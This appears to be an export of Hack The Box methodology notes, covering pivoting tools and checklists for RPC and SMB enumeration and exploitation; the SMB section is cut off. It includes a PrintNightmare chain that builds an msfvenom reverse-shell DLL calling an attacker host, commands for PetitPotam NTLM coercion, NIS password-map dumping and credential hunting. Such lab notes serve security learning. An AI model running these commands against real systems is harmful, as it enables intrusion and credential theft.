Chisel</h2>\n<blockquote>\n<p><strong>Chisel</strong><br>\nTunnel TCP/UDP over HTTP. Single binary, no dependencies. Great when ligolo is not feasible.</p>\n<p>Ref: https://github.com/jpillora/chisel</p>\n</blockquote>\n<h3 id=\"remote-port-forward-target-port-attacker\">Remote port forward (target port → attacker)</h3>\n<p>Expose a localhost port on the target to the attacker:</p>\n<pre><code class=\"language-bash\"># Attacker: server\nchisel server --reverse -p 8080\n</code></pre>\n<pre><code class=\"language-cmd\">:: Target: client — forward target port 8888 to attacker\nchisel.exe client LHOST:8080 R:8888:127.0.0.1:8888\n</code></pre>\n<p>Now <code>localhost:8888</code> on the attacker points to <code>127.0.0.1:8888</code> on the target.</p>\n<pre><code class=\"language-bash\"># Attacker: access the service\ncurl http://127.0.0.1:8888\npython3 exploit.py 127.0.0.1 8888\n</code></pre>\n<h3 id=\"remote-socks-proxy-pivoting\">Remote SOCKS proxy (pivoting)</h3>\n<p>Use the target as a SOCKS proxy to reach internal networks:</p>\n<pre><code class=\"language-bash\"># Attacker: server\nchisel server --reverse -p 8080\n</code></pre>\n<pre><code class=\"language-cmd\">:: Target: client — SOCKS proxy\nchisel.exe client LHOST:8080 R:socks\n</code></pre>\n<pre><code class=\"language-bash\"># Attacker: use proxychains (SOCKS5 on 127.0.0.1:1080)\n# Add to /etc/proxychains4.conf:\n# socks5 127.0.0.1 1080\nproxychains nmap -sT -p 80,445,3389 172.16.0.0/24\nproxychains evil-winrm -i 172.16.0.10 -u admin -p pass\n</code></pre>\n<h3 id=\"local-port-forward-attacker-target\">Local port forward (attacker → target)</h3>\n<p>Less common — used when the target needs to reach the attacker:</p>\n<pre><code class=\"language-bash\"># Attacker: server\nchisel server -p 8080\n</code></pre>\n<pre><code class=\"language-cmd\">:: Target: forward attacker's local port\nchisel.exe client LHOST:8080 9999:127.0.0.1:9999\n</code></pre>\n<h3 id=\"multiple-forwards\">Multiple forwards</h3>\n<pre><code class=\"language-cmd\">:: Multiple ports in a single command\nchisel.exe client LHOST:8080 R:8888:127.0.0.1:8888 R:3306:127.0.0.1:3306 R:6379:127.0.0.1:6379\n</code></pre>\n<h2 id=\"3-ssh-tunneling\">3 // SSH Tunneling</h2>\n<blockquote>\n<p><strong>When to use</strong><br>\nIf you have SSH credentials on the target or on a jump host. No additional tools to transfer.</p>\n</blockquote>\n<h3 id=\"local-port-forward\">Local port forward</h3>\n<pre><code class=\"language-bash\"># Expose remote port on attacker\nssh -L 8888:127.0.0.1:8888 user@TARGET\n# Now localhost:8888 on attacker → 127.0.0.1:8888 on target\n</code></pre>\n<h3 id=\"remote-port-forward\">Remote port forward</h3>\n<pre><code class=\"language-bash\"># From target: expose local port to attacker\nssh -R 8888:127.0.0.1:8888 attacker@LHOST\n</code></pre>\n<h3 id=\"dynamic-socks-proxy\">Dynamic SOCKS proxy</h3>\n<pre><code class=\"language-bash\">ssh -D 1080 user@TARGET\n# Use with proxychains (socks5 127.0.0.1 1080)\n</code></pre>\n<h3 id=\"double-pivot-multi-hop\">Double pivot (multi-hop)</h3>\n<pre><code class=\"language-bash\"># Attacker → Host1 → Host2\nssh -L 2222:HOST2:22 user@HOST1\nssh -L 8888:127.0.0.1:8888 user@127.0.0.1 -p 2222\n</code></pre>\n<h3 id=\"useful-flags\">Useful flags</h3>\n<table>\n<thead>\n<tr>\n<th>Flag</th>\n<th>Purpose</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>-N</code></td>\n<td>No shell, only tunnel</td>\n</tr>\n<tr>\n<td><code>-f</code></td>\n<td>Background</td>\n</tr>\n<tr>\n<td><code>-L</code></td>\n<td>Local forward</td>\n</tr>\n<tr>\n<td><code>-R</code></td>\n<td>Remote forward</td>\n</tr>\n<tr>\n<td><code>-D</code></td>\n<td>Dynamic SOCKS</td>\n</tr>\n<tr>\n<td><code>-J</code></td>\n<td>Jump host (ProxyJump)</td>\n</tr>\n</tbody>\n</table>\n<pre><code class=\"language-bash\"># Typical combination: tunnel in background without shell\nssh -N -f -L 8888:127.0.0.1:8888 user@TARGET\n</code></pre>\n<hr>\n<h2 id=\"4-socat-simple-port-forwarding\">4 // Socat (simple port forwarding)</h2>\n<p>Useful on the target for quick redirects without complex tools:</p>\n<pre><code class=\"language-bash\"># Forward local port → another port/host\nsocat TCP-LISTEN:8888,fork TCP:127.0.0.1:3306\n\n# Forward with bind on all interfaces\nsocat TCP-LISTEN:8888,fork,reuseaddr TCP:INTERNAL_HOST:80\n</code></pre>\n<pre><code class=\"language-cmd\">:: Windows (if socat is available)\nsocat.exe TCP-LISTEN:8888,fork TCP:127.0.0.1:3306\n</code></pre>\n<hr>\n<h2 id=\"5-proxychains\">5 // Proxychains</h2>\n<blockquote>\n<p><strong>Proxychains does not create tunnels</strong><br>\nProxychains <strong>uses</strong> an existing SOCKS proxy (created by chisel, SSH, or other). Forces tools to route through the proxy.</p>\n</blockquote>\n<h3 id=\"configuration\">Configuration</h3>\n<pre><code class=\"language-bash\"># /etc/proxychains4.conf // add at the end:\nsocks5 127.0.0.1 1080\n</code></pre>\n<h3 id=\"usage\">Usage</h3>\n<pre><code class=\"language-bash\">proxychains nmap -sT -Pn -p 80,443,445,3389 INTERNAL_HOST\nproxychains evil-winrm -i INTERNAL_HOST -u user -p pass\nproxychains curl http://INTERNAL_HOST\nproxychains ssh user@INTERNAL_HOST\nproxychains crackmapexec smb INTERNAL_SUBNET/24\n</code></pre>\n<blockquote>\n<p><strong>Proxychains limitations</strong><br>\n- Supports only TCP (no UDP, no ICMP → nmap <code>-sT</code> required, no ping)\n- Slow — reduce the number of ports/hosts in the scan\n- Some tools don't work well (better use ligolo for heavy scans)</p>\n</blockquote>\n<h2 id=\"6-sshuttle-vpn-over-ssh\">6 // sshuttle (VPN over SSH)</h2>\n<pre><code class=\"language-bash\"># All traffic to a subnet via SSH\nsshuttle -r user@TARGET 172.16.0.0/24\n\n# With SSH key\nsshuttle -r user@TARGET 172.16.0.0/24 --ssh-cmd 'ssh -i id_rsa'\n\n# Exclude the target itself (avoid loops)\nsshuttle -r user@TARGET 172.16.0.0/24 -x TARGET_IP\n</code></pre>\n<blockquote>\n<p><strong>sshuttle vs proxychains</strong><br>\nsshuttle is transparent — no need to prefix commands. It works like a VPN. Requires Python on the target and SSH access.</p>\n</blockquote>\n<hr>\n<h2 id=\"7-netsh-windows-built-in\">7 // Netsh (Windows built-in)</h2>\n<p>Native port forwarding on Windows (requires admin):</p>\n<pre><code class=\"language-cmd\">:: Add forward\nnetsh interface portproxy add v4tov4 listenport=8888 listenaddress=0.0.0.0 connectport=8888 connectaddress=127.0.0.1\n\n:: Check\nnetsh interface portproxy show all\n\n:: Remove\nnetsh interface portproxy delete v4tov4 listenport=8888 listenaddress=0.0.0.0\n</code></pre>\n<blockquote>\n<p><strong>When to use netsh</strong><br>\nWhen you are admin on the target and want to expose a localhost service without transferring tools. Persistent until reboot or manual removal.</p>\n</blockquote>\n<hr>\n<h2 id=\"quick-choice\">Quick Choice</h2>\n<blockquote>\n<p><strong>Which tool to use</strong>  </p>\n<table>\n<thead>\n<tr>\n<th>Scenario</th>\n<th>Tool</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Target's localhost</td>\n<td><strong>Ligolo</strong> (route 240.0.0.1) or <strong>Chisel</strong> remote forward</td>\n</tr>\n<tr>\n<td>Pivoting to internal network</td>\n<td><strong>Ligolo</strong> (subnet route) — tools work natively</td>\n</tr>\n<tr>\n<td>Light pivoting (few hosts)</td>\n<td><strong>Chisel</strong> SOCKS + proxychains</td>\n</tr>\n<tr>\n<td>You have SSH on target</td>\n<td><strong>SSH</strong> <code>-L</code> / <code>-D</code> / <strong>sshuttle</strong></td>\n</tr>\n<tr>\n<td>Simple redirect only</td>\n<td><strong>Socat</strong> or <strong>Netsh</strong> (Windows)</td>\n</tr>\n<tr>\n<td>No portable tool</td>\n<td><strong>SSH</strong> tunneling</td>\n</tr>\n</tbody>\n</table>\n</blockquote>\n<hr>\n<h2 id=\"related-machines\">Related Machines</h2>\n<table>\n<thead>\n<tr>\n<th>Machine</th>\n<th>Technique</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Buff</td>\n<td><strong>Ligolo-ng</strong> forwards CloudMe's local-only 8888 port to Kali — CloudMe BOF runs against the tunnel</td>\n</tr>\n<tr>\n<td>Escape</td>\n<td>Local Responder + xp_dirtree relay — the 'port' is the attacker's SMB listener exposed back at the target</td>\n</tr>\n<tr>\n<td>Poison</td>\n<td><strong>SSH dynamic forward (<code>-D</code>)</strong> reaches VNC on <code>127.0.0.1:5901</code> from the FreeBSD host</td>\n</tr>\n</tbody>\n</table>"
    },
    {
      "title": "RPC — Enumeration and Exploitation Checklist",
      "slug": "rpc-enumeration-and-exploitation-checklist",
      "date": "2026·03·11",
      "tags": [
        "htb",
        "rpc",
        "enumeration",
        "methodology",
        "enum"
      ],
      "desc": "Quick Order — Linux (port 111) 1. rpcinfo -p — list all RPC services 2. If NFS present → NFS (showmount, mount, enumerate) 3. If NIS present → dump passwd/shadow maps 4. If rusersd → logged-in users 5. Each RPC service is a separate vector to investigate",
      "body": "<h2 id=\"recommended-execution-priority\">Recommended Execution Priority</h2>\n<blockquote>\n<p><strong>Quick Order — Linux (port 111)</strong><br>\n1. <code>rpcinfo -p</code> — list all RPC services\n2. If NFS present → NFS (showmount, mount, enumerate)\n3. If NIS present → dump passwd/shadow maps\n4. If rusersd → logged-in users\n5. Each RPC service is a separate vector to investigate</p>\n<p><strong>Quick Order — Windows (port 135)</strong><br>\n6. <code>impacket-rpcdump</code> — list endpoints\n7. Null session with <code>rpcclient</code> → users, groups, shares\n8. <code>enum4linux-ng -A</code> — full enumeration\n9. RID cycling → discover users without credentials\n10. Check Print Spooler → PrintNightmare\n11. Check EFSRPC → PetitPotam/Coerce</p>\n</blockquote>\n<hr>\n<h1 id=\"rpc-enumeration-exploitation-checklist\">RPC // Enumeration &amp; Exploitation Checklist</h1>\n<blockquote>\n<p><strong>Context</strong><br>\nRPC (Remote Procedure Call) — port <strong>111/tcp</strong> (rpcbind/portmapper) + dynamic ports for registered services.\nOn Windows: <strong>MSRPC</strong> on port <strong>135/tcp</strong> (endpoint mapper) + dynamic ports (49152+).\nFundamental for enumerating services like NFS, NIS, and for enumerating users/groups/shares on Windows systems (via SMB/RPC).</p>\n</blockquote>\n<hr>\n<h2 id=\"0-detection-service-enumeration\">0 // Detection &amp; Service Enumeration</h2>\n<h3 id=\"linux-rpcbind-port-111\">Linux // rpcbind (port 111)</h3>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Nmap — identify RPC and registered services</li>\n</ul>\n<pre><code class=\"language-bash\">nmap -sV -p 111 &lt;TARGET&gt;\nnmap -sV --script=rpcinfo -p 111 &lt;TARGET&gt;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Rpcinfo — list RPC services</li>\n</ul>\n<pre><code class=\"language-bash\">rpcinfo -p &lt;TARGET&gt;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Common services on rpcbind</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>Service</th>\n<th>Program</th>\n<th>Typical Port</th>\n<th>Notes</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>NFS</td>\n<td>100003</td>\n<td>2049</td>\n<td>NFS — file share</td>\n</tr>\n<tr>\n<td>mountd</td>\n<td>100005</td>\n<td>varies</td>\n<td>NFS mounting</td>\n</tr>\n<tr>\n<td>nlockmgr</td>\n<td>100021</td>\n<td>varies</td>\n<td>NFS lock manager</td>\n</tr>\n<tr>\n<td>status</td>\n<td>100024</td>\n<td>varies</td>\n<td>NFS monitoring</td>\n</tr>\n<tr>\n<td>ypserv</td>\n<td>100004</td>\n<td>varies</td>\n<td>NIS — password maps</td>\n</tr>\n<tr>\n<td>rusersd</td>\n<td>100002</td>\n<td>varies</td>\n<td>Logged-in users</td>\n</tr>\n</tbody>\n</table>\n<blockquote>\n<p><strong>rpcbind = service index</strong><br>\nrpcbind is not a vulnerable service per se, but reveals WHICH services are active.\nEach listed service is a potential attack vector.</p>\n</blockquote>\n<hr>\n<h3 id=\"windows-msrpc-port-135\">Windows // MSRPC (port 135)</h3>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Nmap — identify MSRPC</li>\n</ul>\n<pre><code class=\"language-bash\">nmap -sV -p 135 &lt;TARGET&gt;\nnmap -sV --script=msrpc-enum -p 135 &lt;TARGET&gt;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> IOXIDResolver — enumerate network interfaces</li>\n</ul>\n<pre><code class=\"language-bash\"># Reveals internal IPs and hostnames (useful for dual-homed hosts)\nimpacket-IOXIDResolver -t &lt;TARGET&gt;\n</code></pre>\n<hr>\n<h2 id=\"1-enumeration-via-rpcclient-smbrpc-windows\">1 // Enumeration via rpcclient (SMB/RPC // Windows)</h2>\n<blockquote>\n<p><strong>rpcclient</strong><br>\n<code>rpcclient</code> connects via SMB (445) and uses named pipes for RPC.\nAllows detailed enumeration of users, groups, shares, domain policies.\nRequires credentials or null session (guest/anonymous).</p>\n</blockquote>\n<h3 id=\"11-null-session\">1.1 // Null Session</h3>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Attempt anonymous connection</li>\n</ul>\n<pre><code class=\"language-bash\">rpcclient -U '' -N &lt;TARGET&gt;\nrpcclient -U '%' &lt;TARGET&gt;\nrpcclient -U 'guest%' &lt;TARGET&gt;\n</code></pre>\n<h3 id=\"12-user-enumeration\">1.2 // User Enumeration</h3>\n<pre><code class=\"language-bash\">rpcclient $&gt; enumdomusers\nrpcclient $&gt; querydispinfo\nrpcclient $&gt; querydispinfo2\nrpcclient $&gt; enumdomgroups\nrpcclient $&gt; querygroup 0x200    # Domain Admins RID\nrpcclient $&gt; querygroupmem 0x200\nrpcclient $&gt; queryuser &lt;RID&gt;\nrpcclient $&gt; lookupnames administrator\n</code></pre>\n<h3 id=\"13-share-and-policy-enumeration\">1.3 // Share and Policy Enumeration</h3>\n<pre><code class=\"language-bash\">rpcclient $&gt; netshareenumall\nrpcclient $&gt; netsharegetinfo &lt;SHARE&gt;\nrpcclient $&gt; getdompwinfo          # Password policy\nrpcclient $&gt; getusrdompwinfo &lt;RID&gt;  # User password policy\nrpcclient $&gt; lsaenumsid            # SID enumeration\nrpcclient $&gt; lookupsids &lt;SID&gt;\n</code></pre>\n<h3 id=\"14-printer-enumeration\">1.4 // Printer Enumeration</h3>\n<pre><code class=\"language-bash\">rpcclient $&gt; enumprinters\n# Printers can reveal internal hostnames, location info\n</code></pre>\n<blockquote>\n<p><strong>enum4linux-ng — all-in-one</strong><br>\n```bash\nenum4linux-ng -A <TARGET></p>\n<h1 id=\"or-with-credentials\">or with credentials</h1>\n<p>enum4linux-ng -A -u '<USER>' -p '<PASS>' <TARGET>\n```\nAutomates: null session, users, groups, shares, password policy, OS info.</p>\n</blockquote>\n<hr>\n<h2 id=\"2-nis-network-information-service\">2 // NIS (Network Information Service)</h2>\n<blockquote>\n<p><strong>NIS (YP)</strong><br>\nNIS distributes configuration maps (passwd, group, hosts) over the network.\nIf exposed, it can reveal password hashes for all users of the NIS domain.</p>\n</blockquote>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Check if NIS is active (ypserv on rpcbind)</li>\n</ul>\n<pre><code class=\"language-bash\">rpcinfo -p &lt;TARGET&gt; | grep ypserv\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Enumerate NIS domain and maps</li>\n</ul>\n<pre><code class=\"language-bash\"># Find the NIS domain\nypwhich -d &lt;DOMAIN&gt; &lt;TARGET&gt;\n\n# Enumerate available maps\nypcat -d &lt;DOMAIN&gt; -h &lt;TARGET&gt; passwd\nypcat -d &lt;DOMAIN&gt; -h &lt;TARGET&gt; group\nypcat -d &lt;DOMAIN&gt; -h &lt;TARGET&gt; hosts\nypcat -d &lt;DOMAIN&gt; -h &lt;TARGET&gt; shadow   # rare but possible\n</code></pre>\n<hr>\n<h2 id=\"3-rusersd-rusers\">3 // Rusersd / Rusers</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Logged-in users on the remote system</li>\n</ul>\n<pre><code class=\"language-bash\">rusers -l &lt;TARGET&gt;\n# oppure\nrpcinfo -p &lt;TARGET&gt; | grep rusersd\n</code></pre>\n<hr>\n<h2 id=\"4-msrpc-exploitation-windows\">4 // MSRPC Exploitation (Windows)</h2>\n<h3 id=\"41-enumeration-with-impacket\">4.1 // Enumeration with impacket</h3>\n<pre><code class=\"language-bash\"># User enumeration via SAMR\nimpacket-samrdump &lt;TARGET&gt;\nimpacket-samrdump &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASS&gt;@&lt;TARGET&gt;\n\n# Enumeration via LSARPC\nimpacket-lookupsid &lt;TARGET&gt;\nimpacket-lookupsid &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASS&gt;@&lt;TARGET&gt;\n\n# Brute force RID cycling (discover users without credentials)\nimpacket-lookupsid &lt;DOMAIN&gt;/guest@&lt;TARGET&gt; -no-pass 20000\n</code></pre>\n<h3 id=\"42-rid-cycling-with-nxc\">4.2 // RID Cycling with nxc</h3>\n<pre><code class=\"language-bash\"># Enumerate users via RID brute force\nnxc smb &lt;TARGET&gt; -u 'guest' -p '' --rid-brute 5000\nnxc smb &lt;TARGET&gt; -u '' -p '' --rid-brute 5000\n</code></pre>\n<h3 id=\"43-printnightmare-cve-2021-1675-cve-2021-34527\">4.3 // PrintNightmare (CVE-2021-1675 / CVE-2021-34527)</h3>\n<pre><code class=\"language-bash\"># Check if the Print Spooler service is active\nrpcclient -U '&lt;USER&gt;%&lt;PASS&gt;' &lt;TARGET&gt; -c 'enumprinters'\nimpacket-rpcdump &lt;TARGET&gt; | grep -i spoolsv\n\n# Exploit\n# Step 1: create malicious DLL\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;ATTACKER&gt; LPORT=443 -f dll -o shell.dll\n\n# Step 2: host the DLL\npython3 -m http.server 8000\n# or\nimpacket-smbserver share . -smb2support\n\n# Step 3: exploit\npython3 CVE-2021-1675.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASS&gt;@&lt;TARGET&gt; '\\\\&lt;ATTACKER&gt;\\share\\shell.dll'\n</code></pre>\n<h3 id=\"44-petitpotam-cve-2021-36942\">4.4 // PetitPotam (CVE-2021-36942)</h3>\n<pre><code class=\"language-bash\"># Coerce NTLM authentication via EFSRPC\npython3 PetitPotam.py &lt;ATTACKER&gt; &lt;TARGET&gt;\npython3 PetitPotam.py -u '&lt;USER&gt;' -p '&lt;PASS&gt;' -d '&lt;DOMAIN&gt;' &lt;ATTACKER&gt; &lt;TARGET&gt;\n</code></pre>\n<h3 id=\"45-coerce-authentication-generic\">4.5 // Coerce Authentication (generic)</h3>\n<pre><code class=\"language-bash\"># Coerce // test all coerce methods\npython3 Coercer.py -l &lt;ATTACKER&gt; -t &lt;TARGET&gt;\npython3 Coercer.py -l &lt;ATTACKER&gt; -t &lt;TARGET&gt; -u '&lt;USER&gt;' -p '&lt;PASS&gt;' -d '&lt;DOMAIN&gt;'\n</code></pre>\n<hr>\n<h2 id=\"5-rpc-endpoint-discovery\">5 // RPC Endpoint Discovery</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Dump of all RPC endpoints</li>\n</ul>\n<pre><code class=\"language-bash\">impacket-rpcdump &lt;TARGET&gt;\nimpacket-rpcdump &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASS&gt;@&lt;TARGET&gt;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Relevant interfaces to search for</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>UUID</th>\n<th>Interface</th>\n<th>Relevance</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>12345778-1234-abcd-...</code></td>\n<td>SAMR</td>\n<td>User enumeration</td>\n</tr>\n<tr>\n<td><code>12345778-1234-abcd-...</code></td>\n<td>LSARPC</td>\n<td>SID/Name resolution</td>\n</tr>\n<tr>\n<td><code>367abb81-9844-...</code></td>\n<td>EFSRPC</td>\n<td>PetitPotam coercion</td>\n</tr>\n<tr>\n<td><code>76f03f96-cdfd-...</code></td>\n<td>Print Spooler</td>\n<td>PrintNightmare</td>\n</tr>\n<tr>\n<td><code>c681d488-d850-...</code></td>\n<td>DFSNM</td>\n<td>DFSCoerce</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h2 id=\"related-machines\">Related Machines</h2>\n<table>\n<thead>\n<tr>\n<th>Machine</th>\n<th>Technique</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Escape</td>\n<td>MS-RPC interfaces on the DC enumerated as part of the AD service signature (DNS / Kerberos / LDAP cluster)</td>\n</tr>\n<tr>\n<td>Remote</td>\n<td><code>rpcinfo</code> enumeration on port 111 discovers the NFS service before mounting</td>\n</tr>\n</tbody>\n</table>"
    },
    {
      "title": "SMB — Enumeration and Exploitation Checklist",
      "slug": "smb-enumeration-and-exploitation-checklist",
      "date": "2026·03·11",
      "tags": [
        "htb",
        "smb",
        "enumeration",
        "methodology",
        "enum"
      ],
      "desc": "Quick Order 1. nxc smb &lt;TARGET&gt; — OS, hostname, domain, signing 2. Null session / Guest → --shares, --rid-brute 3. enum4linux-ng -A — full enumeration 4. Access readable shares → search for credentials, backups, GPP 5. User enumeration → user list for password spray 6.…",
      "body": "<h2 id=\"recommended-execution-priority\">Recommended Execution Priority</h2>\n<blockquote>\n<p><strong>Quick Order</strong><br>\n1. <code>nxc smb &lt;TARGET&gt;</code> — OS, hostname, domain, signing\n2. Null session / Guest → <code>--shares</code>, <code>--rid-brute</code>\n3. <code>enum4linux-ng -A</code> — full enumeration\n4. Access readable shares → search for credentials, backups, GPP\n5. User enumeration → user list for password spray\n6. Password spray with common credentials\n7. Check CVEs on version (EternalBlue, SambaCry, SMBGhost)\n8. If signing:False → NTLM relay\n9. If you have hashes → Pass-the-Hash\n10. Lateral movement: PsExec, WmiExec, SmbExec</p>\n</blockquote>\n<hr>\n<h1 id=\"smb-enumeration-exploitation-checklist\">SMB // Enumeration &amp; Exploitation Checklist</h1>\n<blockquote>\n<p><strong>Context</strong><br>\nSMB (Server Message Block) — port <strong>445/tcp</strong> (direct) and <strong>139/tcp</strong> (via NetBIOS).\nFile/print sharing protocol on Windows (and Linux via Samba). One of the richest vectors on HTB: anonymous shares, weak credentials, relay, critical CVEs. Present on almost all Windows machines and many Linux.</p>\n</blockquote>\n<hr>\n<h2 id=\"0-detection-version-enumeration\">0 // Detection &amp; Version Enumeration</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Nmap — identify SMB and versions</li>\n</ul>\n<pre><code class=\"language-bash\">nmap -sV -p 139,445 &lt;TARGET&gt;\nnmap -sV --script=smb* -p 445 &lt;TARGET&gt;\nnmap --script=smb-os-discovery -p 445 &lt;TARGET&gt;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> NetExec — OS, hostname, domain, signing</li>\n</ul>\n<pre><code class=\"language-bash\">nxc smb &lt;TARGET&gt;\n</code></pre>\n<pre><code>SMB  10.10.10.x  445  HOSTNAME  [*] Windows 10.0 Build 17763 x64 (name:HOSTNAME) (domain:domain.htb) (signing:True) (SMBv1:False)\n</code></pre>\n<blockquote>\n<p><strong>Output nxc — key information</strong><br>\n- <strong>OS version</strong> and <strong>build number</strong> → CVE lookup\n- <strong>hostname</strong> and <strong>domain</strong> → add to <code>/etc/hosts</code>\n- <strong>signing:False</strong> → vulnerable to relay (NTLM relay)\n- <strong>SMBv1:True</strong> → potential EternalBlue</p>\n</blockquote>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> SMB protocol version</li>\n</ul>\n<pre><code class=\"language-bash\">nxc smb &lt;TARGET&gt; --dialects\n</code></pre>\n<hr>\n<h2 id=\"1-null-session-guest-access\">1 // Null Session &amp; Guest Access</h2>\n<blockquote>\n<p><strong>First check — always</strong><br>\nTry anonymous and guest access before any other technique.</p>\n</blockquote>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Null session</li>\n</ul>\n<pre><code class=\"language-bash\"># smbclient\nsmbclient -N -L //&lt;TARGET&gt;/\n\n# nxc\nnxc smb &lt;TARGET&gt; -u '' -p ''\nnxc smb &lt;TARGET&gt; -u '' -p '' --shares\n\n# rpcclient\nrpcclient -U '' -N &lt;TARGET&gt;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Guest session</li>\n</ul>\n<pre><code class=\"language-bash\">nxc smb &lt;TARGET&gt; -u 'guest' -p ''\nnxc smb &lt;TARGET&gt; -u 'guest' -p '' --shares\nsmbclient -U 'guest%' -L //&lt;TARGET&gt;/\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> enum4linux-ng — full enumeration</li>\n</ul>\n<pre><code class=\"language-bash\">enum4linux-ng -A &lt;TARGET&gt;\nenum4linux-ng -A -u '' -p '' &lt;TARGET&gt;\n</code></pre>\n<hr>\n<h2 id=\"2-share-enumeration\">2 // Share Enumeration</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> List shares</li>\n</ul>\n<pre><code class=\"language-bash\"># nxc (shows READ/WRITE permissions)\nnxc smb &lt;TARGET&gt; -u '&lt;USER&gt;' -p '&lt;PASS&gt;' --shares\n\n# smbclient\nsmbclient -U '&lt;USER&gt;%&lt;PASS&gt;' -L //&lt;TARGET&gt;/\n\n# smbmap (maps permissions)\nsmbmap -H &lt;TARGET&gt;\nsmbmap -H &lt;TARGET&gt; -u '&lt;USER&gt;' -p '&lt;PASS&gt;'\nsmbmap -H &lt;TARGET&gt; -u null\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Access a share</li>\n</ul>\n<pre><code class=\"language-bash\">smbclient -U '&lt;USER&gt;%&lt;PASS&gt;' //&lt;TARGET&gt;/&lt;SHARE&gt;\nsmb: \\&gt; ls\nsmb: \\&gt; recurse ON\nsmb: \\&gt; prompt OFF\nsmb: \\&gt; mget *\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Recursive download with smbget</li>\n</ul>\n<pre><code class=\"language-bash\">smbget -R smb://&lt;TARGET&gt;/&lt;SHARE&gt; -U '&lt;USER&gt;%&lt;PASS&gt;'\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Automatic spider with nxc</li>\n</ul>\n<pre><code class=\"language-bash\"># Search for patterns in all files of the shares\nnxc smb &lt;TARGET&gt; -u '&lt;USER&gt;' -p '&lt;PASS&gt;' --spider &lt;SHARE&gt; --regex &quot;password|secret|credential|\\.kdbx|\\.conf&quot;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Default shares to check</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>Share</th>\n<th>Notes</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>IPC$</code></td>\n<td>Named pipes, RPC — null session for user enum</td>\n</tr>\n<tr>\n<td><code>C$</code></td>\n<td>Root drive — requires admin</td>\n</tr>\n<tr>\n<td><code>ADMIN$</code></td>\n<td>%SystemRoot% — requires admin</td>\n</tr>\n<tr>\n<td><code>NETLOGON</code></td>\n<td>Logon scripts — domain controller</td>\n</tr>\n<tr>\n<td><code>SYSVOL</code></td>\n<td>Group Policy — domain controller, often contains passwords in GPP</td>\n</tr>\n<tr>\n<td>Custom shares</td>\n<td>Any custom name = potential leak</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h2 id=\"3-content-enumeration\">3 // Content Enumeration</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span 